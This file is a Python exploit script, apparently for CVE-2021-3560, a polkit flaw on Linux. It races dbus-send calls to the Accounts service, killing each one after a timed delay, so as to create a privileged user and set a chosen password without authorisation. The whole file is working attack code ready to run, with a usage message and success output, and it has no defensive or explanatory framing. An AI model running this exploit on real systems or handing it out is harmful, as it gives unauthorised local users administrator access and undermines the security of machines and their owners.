import os
import sys
import pexpect

# Commands for this exploit come from https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/

def getTimeRange():
	cmd = 'bash -c "time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:test string:\'timetest\' int32:1"'
	p = pexpect.spawn(cmd)
	p.expect('real\s+0m(0.\d+)')
	max = int(float(p.match.group(1))*1000)
	p.expect('user\s+0m(0.\d+)')
	min = int(float(p.match.group(1))*1000)
	return (min, max)

foundTime = None
def addUser(username, userstring):
	global foundTime
	(min, max) = getTimeRange()
	for i in range(min, max):	
		for j in range(0,20):
			os.system("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:"+username+" string:'"+userstring+"' int32:1 & sleep "+str(i/1000.0)+"s 2>/dev/null; kill $!")
		p = pexpect.spawn("id %s"% username)
		try:
			p.expect("gid=",1)
		except:
			continue
		foundTime = i
		return True
	return False

def setPassword(username, password):
	global foundTime
	p = pexpect.spawn("id %s" % username)
	p.expect("uid=(\d+)")
	uid = p.match.group(1).decode('ascii')
	passwordFile = "/tmp/cve-2021-3560.pwd"
	try:
		os.system("openssl passwd -5 "+password+" > " + passwordFile)
		f = open(passwordFile)
		passwordHash = f.readline().rstrip()
		f.close()
		print(passwordHash)
		for j in range(0,20):
			os.system("dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User"+uid+" org.freedesktop.Accounts.User.SetPassword string:'"+passwordHash+"' string:GoldenEye & sleep "+str(foundTime/1000.0)+"s  2>/dev/null; kill $!")	   		
	finally:
		try:
			os.unlink(passwordFile)
		except:
			pass	

try:
	username = sys.argv[1]
	userstring = 'cve-2021-3560'
	password = sys.argv[2]
except:
	print("Usage: %s <USERNAME> <PASSWORD>" % sys.argv[0])
	sys.exit(1)

if (not addUser(username, userstring)):
	print("[-] Failed to add user")
	sys.exit(0)
setPassword(username, password)
print("[+] user '%s' added with password '%s'" % (username, password))
